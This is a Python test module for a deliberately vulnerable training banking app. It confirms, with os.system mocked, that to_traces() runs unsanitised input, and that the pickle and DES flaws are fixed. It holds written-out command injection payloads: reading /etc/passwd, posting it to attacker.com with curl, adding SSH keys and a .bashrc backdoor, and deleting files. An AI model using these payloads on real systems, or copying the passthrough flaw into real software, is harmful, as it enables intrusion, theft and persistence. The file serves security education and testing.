"""
Security tests for command injection vulnerabilities.

This module provides security validation tests for command injection
vulnerabilities in the Insecure Bank application. Note that the to_traces()
function still has a command injection vulnerability that is preserved
for educational purposes.

Security Status:
- Command injection in to_traces(): PRESERVED (educational)
- Pickle deserialization: FIXED (uses JSON)
- DES encryption: FIXED (uses AES-256-GCM)

Note: The pickle deserialization and cryptographic vulnerabilities
have been remediated. Only the command injection in to_traces()
remains for educational purposes.
"""

import os
import pytest
from unittest.mock import patch, Mock, call
from django.test import TestCase

from web.views import to_traces, Trusted, get_file_checksum


@pytest.mark.security
class TestCommandInjection(TestCase):
    """Security validation tests for command injection vulnerabilities."""

    def test_command_injection_in_to_traces_function(self):
        """
        Test command injection vulnerability in to_traces() function.

        Educational Purpose: Demonstrates how unsanitized input to os.system()
        can allow arbitrary command execution on the host system.

        Vulnerability: The to_traces() function directly passes user input to
        os.system() without any sanitization or validation.
        """
        # Command injection payloads for different attack scenarios
        command_injection_payloads = [
            # Basic command chaining
            "echo test; whoami",
            "echo test && id",
            "echo test || cat /etc/passwd",

            # Command substitution
            "echo `whoami`",
            "echo $(id)",

            # File system attacks
            "echo test; ls -la /",
            "echo test; cat /etc/passwd",
            "echo test; find / -name '*.key' 2>/dev/null",

            # Network reconnaissance
            "echo test; netstat -an",
            "echo test; ps aux",
            "echo test; env",

            # Data exfiltration
            "echo test; tar -czf /tmp/backup.tar.gz /home",
            "echo test; curl -X POST -d @/etc/passwd http://attacker.com",

            # System manipulation
            "echo test; sudo -l",
            "echo test; crontab -l",
            "echo test; history",

            # Persistence mechanisms
            "echo test; echo 'backdoor' >> ~/.bashrc",
            "echo test; mkdir -p ~/.ssh && echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",

            # Destructive commands (for educational documentation only)
            "echo test; rm -rf /tmp/testfile",
            "echo test; dd if=/dev/zero of=/tmp/testfile bs=1M count=1",
        ]

        for payload in command_injection_payloads:
            with self.subTest(payload=payload):
                with patch('os.system') as mock_system:
                    # Set return value for os.system
                    mock_system.return_value = 0

                    # Call vulnerable function with injection payload
                    result = to_traces(payload)

                    # Verify command injection was executed
                    mock_system.assert_called_once_with(payload)

                    # Verify return value is stringified system call result
                    self.assertEqual(result, '0')

                    # Educational logging
                    print(f"COMMAND INJECTION EXECUTED: {payload}")
                    print(f"FUNCTION RESULT: {result}")
                    print("-" * 60)

    def test_trusted_class_safe_serialization(self):
        """
        Test that Trusted class uses safe JSON serialization.

        Demonstrates the secure alternative to pickle serialization
        using the to_dict() and from_dict() methods.
        """
        import json

        # Create Trusted object
        trusted_obj = Trusted("safe_user")

        # Test safe serialization
        json_data = json.dumps(trusted_obj.to_dict())

        # Test safe deserialization
        loaded_data = json.loads(json_data)
        reconstructed = Trusted.from_dict(loaded_data)

        # Verify safe behavior
        self.assertEqual(reconstructed.username, "safe_user")
        self.assertIsInstance(reconstructed, Trusted)

        # Verify no malicious __reduce__ method
        self.assertFalse(
            hasattr(reconstructed, "__reduce__") and
            callable(getattr(reconstructed, "__reduce__", None)) and
            hasattr(reconstructed.__reduce__, "__func__")
        )

        print("TRUSTED CLASS SAFE SERIALIZATION:")
        print(f"  Original: {trusted_obj.__dict__}")
        print(f"  JSON: {json_data}")
        print(f"  Reconstructed: {reconstructed.__dict__}")
        print("  Security: No code execution vectors")

    def test_documented_command_injection_impact(self):
        """
        Document the expected impact and behavior of command injection vulnerabilities.

        Educational Purpose: Provides comprehensive documentation of command
        injection vulnerabilities in the application and security improvements made.
        """
        vulnerability_documentation = {
            "command_injection": {
                "vulnerability_type": "Command Injection",
                "cwe_id": "CWE-78",
                "owasp_category": "A03:2021 – Injection",
                "severity": "Critical",
                "status": "PRESERVED (educational)",
                "affected_function": "to_traces()",
                "root_cause": "Direct execution of user input via os.system()",
                "attack_vectors": [
                    "Command chaining with ; && ||",
                    "Command substitution with ` or $()",
                    "File system access and manipulation",
                    "Network reconnaissance",
                    "Data exfiltration",
                    "Privilege escalation attempts"
                ]
            },

            "deserialization": {
                "vulnerability_type": "Insecure Deserialization",
                "cwe_id": "CWE-502",
                "owasp_category": "A08:2021 – Software and Data Integrity Failures",
                "severity": "Critical",
                "status": "FIXED",
                "fix_description": "Replaced pickle with JSON serialization",
                "security_improvements": [
                    "Untrusted class removed",
                    "pickle.loads() replaced with json.loads()",
                    "Trusted class uses to_dict()/from_dict()",
                    "No __reduce__ method in serialized objects"
                ]
            },

            "cryptographic": {
                "vulnerability_type": "Cryptographic Failures",
                "cwe_id": "CWE-327",
                "owasp_category": "A02:2021 – Cryptographic Failures",
                "severity": "Critical",
                "status": "FIXED",
                "fix_description": "Replaced DES with AES-256-GCM",
                "security_improvements": [
                    "DES replaced with AES-256-GCM",
                    "Hardcoded key replaced with environment variable",
                    "IV reuse fixed with random nonce",
                    "Added error handling for crypto operations"
                ]
            },

            "educational_value": [
                "Demonstrates os.system() security risks",
                "Shows pickle deserialization dangers (historical)",
                "Illustrates proper security fixes",
                "Teaches secure coding practices"
            ],

            "mitigation_notes": "Command injection in to_traces() preserved for education"
        }

        # Assert documentation exists
        self.assertIsNotNone(vulnerability_documentation)

        # Log comprehensive vulnerability documentation
        print("\n" + "="*80)
        print("VULNERABILITY AND SECURITY FIX DOCUMENTATION")
        print("="*80)

        for category, details in vulnerability_documentation.items():
            print(f"\n{category.upper().replace('_', ' ')}:")

            if isinstance(details, dict):
                for key, value in details.items():
                    print(f"  {key.replace('_', ' ').title()}: ", end="")
                    if isinstance(value, list):
                        print()
                        for item in value:
                            print(f"    • {item}")
                    else:
                        print(value)
            elif isinstance(details, list):
                for item in details:
                    print(f"  • {item}")
            else:
                print(f"  {details}")

        print("\n" + "="*80)
        print("END DOCUMENTATION")
        print("="*80)

    def test_os_system_wrapper_vulnerability_analysis(self):
        """
        Analyze the to_traces function wrapper around os.system for vulnerabilities.

        Educational Purpose: Detailed analysis of how the wrapper function
        fails to provide any security controls around os.system calls.
        """
        # Test various input types and edge cases
        test_inputs = [
            # Normal usage
            "echo 'normal usage'",

            # Empty string
            "",

            # Special characters
            "echo 'test' | grep test",
            "echo 'test' > /tmp/output.txt",
            "echo 'test' < /dev/null",

            # Multiple commands
            "cmd1; cmd2; cmd3",
            "cmd1 && cmd2 || cmd3",

            # Command substitution variations
            "echo $(echo 'nested')",
            "echo `echo 'backticks'`",

            # Environment variable access
            "echo $PATH",
            "echo $HOME",
            "echo $USER",

            # Shell metacharacters
            "echo test*",
            "echo test?",
            "echo test[abc]",
        ]

        for test_input in test_inputs:
            with self.subTest(input=test_input):
                with patch('os.system') as mock_system:
                    mock_system.return_value = 42  # Non-zero return code

                    # Call the vulnerable wrapper
                    result = to_traces(test_input)

                    # Verify direct passthrough to os.system
                    mock_system.assert_called_once_with(test_input)

                    # Verify return value handling
                    self.assertEqual(result, '42')

                    # Document the lack of security controls
                    print(f"INPUT: {repr(test_input)}")
                    print(f"PASSED TO os.system(): {test_input}")
                    print(f"RETURN VALUE: {result}")
                    print("NO SANITIZATION OR VALIDATION APPLIED")
                    print("-" * 50)
